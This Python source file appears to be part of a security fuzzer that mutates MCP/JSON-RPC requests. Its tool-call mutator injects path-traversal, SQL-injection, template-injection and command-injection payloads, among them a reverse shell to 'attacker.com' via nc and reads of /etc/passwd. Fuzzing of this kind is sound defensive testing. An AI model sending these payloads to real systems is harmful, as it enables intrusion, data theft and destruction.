"""MCP-protocol-aware mutation strategies."""

from __future__ import annotations

import json
import random
from typing import Any

from .mutators import Mutator


class MCPStructureMutator(Mutator):
    """Mutations that understand MCP/JSON-RPC structure."""

    name = "mcp_structure"

    def mutate(self, data: bytes) -> bytes:
        try:
            obj = json.loads(data.decode("utf-8", errors="replace"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            return self._random_byte_mutation(data)

        if not isinstance(obj, dict):
            return self._random_byte_mutation(data)

        mutation_type = random.choice([
            "change_method",
            "corrupt_id",
            "mutate_params",
            "add_field",
            "remove_field",
            "change_jsonrpc_version",
            "duplicate_field",
            "nest_deeply",
        ])

        if mutation_type == "change_method":
            obj = self._change_method(obj)
        elif mutation_type == "corrupt_id":
            obj = self._corrupt_id(obj)
        elif mutation_type == "mutate_params":
            obj = self._mutate_params(obj)
        elif mutation_type == "add_field":
            obj = self._add_field(obj)
        elif mutation_type == "remove_field":
            obj = self._remove_field(obj)
        elif mutation_type == "change_jsonrpc_version":
            obj = self._change_version(obj)
        elif mutation_type == "duplicate_field":
            obj = self._duplicate_field(obj)
        elif mutation_type == "nest_deeply":
            obj = self._nest_deeply(obj)

        try:
            return json.dumps(obj, ensure_ascii=False).encode("utf-8")
        except (TypeError, ValueError):
            return data

    def _random_byte_mutation(self, data: bytes) -> bytes:
        """Fallback byte-level mutation."""
        if not data:
            return data
        data = bytearray(data)
        pos = random.randint(0, len(data) - 1)
        data[pos] = random.randint(0, 255)
        return bytes(data)

    def _change_method(self, obj: dict[str, Any]) -> dict[str, Any]:
        """Change the method to something unexpected."""
        methods = [
            "tools/call", "tools/list", "resources/read", "resources/list",
            "prompts/get", "initialize", "ping", "shutdown",
            "../../../etc/passwd", "'; DROP TABLE tools;--",
            "AAAA" * 100, "", None, 12345, {"nested": "method"},
            "tools/call\x00hidden", "tools/../../call",
        ]
        obj["method"] = random.choice(methods)
        return obj

    def _corrupt_id(self, obj: dict[str, Any]) -> dict[str, Any]:
        """Corrupt the request ID."""
        ids = [
            None, "", 0, -1, 2**31, 2**63, -2**63,
            1.5, float("inf"), float("-inf"), float("nan"),
            "string_id", {"obj": "id"}, ["array", "id"],
            True, False, "\x00", "A" * 10000,
        ]
        obj["id"] = random.choice(ids)
        return obj

    def _mutate_params(self, obj: dict[str, Any]) -> dict[str, Any]:
        """Mutate the params object."""
        if "params" not in obj or not isinstance(obj["params"], dict):
            obj["params"] = {}

        mutation = random.choice([
            "add_key", "inject_value", "change_type", "deep_nest",
        ])

        if mutation == "add_key":
            keys = ["__proto__", "constructor", "prototype",
                    "../../../", "$(whoami)", "; ls", "' OR '1'='1"]
            obj["params"][random.choice(keys)] = "injected"
        elif mutation == "inject_value":
            if obj["params"]:
                key = random.choice(list(obj["params"].keys()))
                payloads = [
                    "../../../etc/passwd", "'; DROP TABLE users;--",
                    "{{7*7}}", "${7*7}", "{{constructor.constructor('return this')()}}",
                    "\x00\x01\x02", "A" * 10000, {"$ne": ""}, {"$gt": ""},
                ]
                obj["params"][key] = random.choice(payloads)
        elif mutation == "change_type":
            obj["params"] = random.choice([
                None, [], "string", 12345, True,
            ])
        elif mutation == "deep_nest":
            nested = obj["params"]
            for _ in range(random.randint(10, 100)):
                nested = {"nested": nested}
            obj["params"] = nested

        return obj

    def _add_field(self, obj: dict[str, Any]) -> dict[str, Any]:
        """Add unexpected fields."""
        fields = [
            ("__proto__", {"polluted": True}),
            ("constructor", {"name": "Object"}),
            ("prototype", {}),
            ("_private", "leaked"),
            ("admin", True),
            ("role", "admin"),
            ("debug", True),
            ("internal", {"secret": "exposed"}),
        ]
        key, value = random.choice(fields)
        obj[key] = value
        return obj

    def _remove_field(self, obj: dict[str, Any]) -> dict[str, Any]:
        """Remove required fields."""
        fields = ["jsonrpc", "method", "id", "params"]
        if fields:
            to_remove = random.choice(fields)
            if isinstance(obj, dict):
                obj.pop(to_remove, None)
        return obj

    def _change_version(self, obj: dict[str, Any]) -> dict[str, Any]:
        """Change JSON-RPC version."""
        versions = ["1.0", "2.1", "3.0", "", None, 2.0, ["2.0"], {"v": "2.0"}]
        obj["jsonrpc"] = random.choice(versions)
        return obj

    def _duplicate_field(self, obj: dict[str, Any]) -> dict[str, Any]:
        """Create JSON with duplicate keys (via string manipulation)."""
        obj["__duplicate_test__"] = "first"
        return obj

    def _nest_deeply(self, obj: dict[str, Any]) -> dict[str, Any]:
        """Create deeply nested structure."""
        depth = random.randint(50, 500)
        nested: Any = "leaf"
        for _ in range(depth):
            nested = {"n": nested}
        obj["deep"] = nested
        return obj


class MCPToolCallMutator(Mutator):
    """Mutations specific to tools/call requests."""

    name = "mcp_tool_call"

    def __init__(self, known_tools: list[str] | None = None):
        self.known_tools = known_tools or []

    def set_tools(self, tools: list[str]):
        """Update known tools list."""
        self.known_tools = tools

    def mutate(self, data: bytes) -> bytes:
        try:
            obj = json.loads(data.decode("utf-8", errors="replace"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            return data

        if not isinstance(obj, dict):
            return data

        if obj.get("method") != "tools/call":
            obj["method"] = "tools/call"

        if "params" not in obj or not isinstance(obj["params"], dict):
            obj["params"] = {}

        if "name" not in obj["params"]:
            if self.known_tools:
                obj["params"]["name"] = random.choice(self.known_tools)
            else:
                obj["params"]["name"] = "unknown_tool"

        mutation = random.choice([
            "inject_path_traversal",
            "inject_command",
            "inject_sql",
            "type_confusion",
            "overflow",
            "format_string",
        ])

        args = obj["params"].get("arguments")
        if not isinstance(args, dict):
            args = {}
            obj["params"]["arguments"] = args

        if mutation == "inject_path_traversal":
            payloads = [
                "../../../etc/passwd", "....//....//etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/passwd%00.txt", "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc/passwd",
            ]
            args["path"] = random.choice(payloads)
            args["file"] = random.choice(payloads)
            args["filename"] = random.choice(payloads)

        elif mutation == "inject_command":
            payloads = [
                "; id", "| cat /etc/passwd", "` whoami `",
                "$(cat /etc/passwd)", "&& ls -la",
                "\n/bin/sh", "| nc attacker.com 4444 -e /bin/sh",
                "`sleep 5`", "'; sleep 5; '",
            ]
            args["command"] = random.choice(payloads)
            args["cmd"] = random.choice(payloads)
            args["input"] = random.choice(payloads)

        elif mutation == "inject_sql":
            payloads = [
                "' OR '1'='1", "1; DROP TABLE users;--",
                "1 UNION SELECT * FROM users--",
                "admin'--", "1' AND SLEEP(5)--",
                "'; EXEC xp_cmdshell('whoami');--",
            ]
            args["query"] = random.choice(payloads)
            args["id"] = random.choice(payloads)
            args["search"] = random.choice(payloads)

        elif mutation == "type_confusion":
            args["id"] = random.choice([[], {}, None, True, "string_instead_of_int"])
            args["count"] = random.choice(["not_a_number", -1, 2**64, 1.5])
            args["enabled"] = random.choice([1, "true", [], {}])

        elif mutation == "overflow":
            args["size"] = 2**64
            args["length"] = -1
            args["data"] = "A" * 100000

        elif mutation == "format_string":
            payloads = ["%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n", "{0}{1}{2}"]
            args["format"] = random.choice(payloads)
            args["template"] = random.choice(payloads)

        obj["params"]["arguments"] = args

        try:
            return json.dumps(obj, ensure_ascii=False).encode("utf-8")
        except (TypeError, ValueError):
            return data
